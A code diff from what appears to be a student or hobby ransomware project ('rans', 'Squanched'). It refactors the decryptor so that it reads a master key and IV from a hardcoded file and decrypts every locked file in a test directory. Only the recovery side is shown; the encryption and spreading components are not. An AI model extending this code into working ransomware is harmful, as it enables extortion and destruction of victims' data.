@@ -109,27 +109,9 @@ void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD Ciphe
 
 }
 
-int main()
+void decrypt_wrapper(string path, PBYTE masterIV, PBYTE masterKey)
 {
-	PBYTE masterIV = nullptr, masterKey = nullptr;
-	masterIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
-	if(masterIV == nullptr)
-	{
-		//TODO cleanup
-	}
-	masterKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
-	if (masterKey == nullptr)
-	{
-		//TODO cleanup
-	}
-	string pathToMasters = "";
-	std::ifstream masterKeyIVFile;
-	masterKeyIVFile.open(pathToMasters, std::ios::binary);
-	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
-	masterKeyIVFile.read((char*)masterIV, IV_LEN);
-	masterKeyIVFile.close();
-
-	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans1.txt" + string(LOCKED_EXTENSION);
+	if (!do_decrypt(path)) return;
 	PBYTE keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	PBYTE keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	PBYTE iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
@@ -152,6 +134,30 @@ int main()
 	memcpy(key, keyIVBuff, KEY_LEN);
 	memcpy(iv, keyIVBuff + KEY_LEN, IV_LEN);
 	DecryptData(path,key,iv,cipher,cipherSize, paddingSize);
+}
+
+int main()
+{
+	PBYTE masterIV = nullptr, masterKey = nullptr;
+	masterIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if(masterIV == nullptr)
+	{
+		//TODO cleanup
+	}
+	masterKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
+	if (masterKey == nullptr)
+	{
+		//TODO cleanup
+	}
+	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
+	std::ifstream masterKeyIVFile;
+	masterKeyIVFile.open(pathToMasters, std::ios::binary);
+	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
+	masterKeyIVFile.read((char*)masterIV, IV_LEN);
+	masterKeyIVFile.close();
+
+	string path = "C:\\rans\\236499\\Squanched\\Debug\\testDir";
+	iterate(path, &decrypt_wrapper, masterIV, masterKey);
 
 	//HeapFree(cipher);
 	return 0;
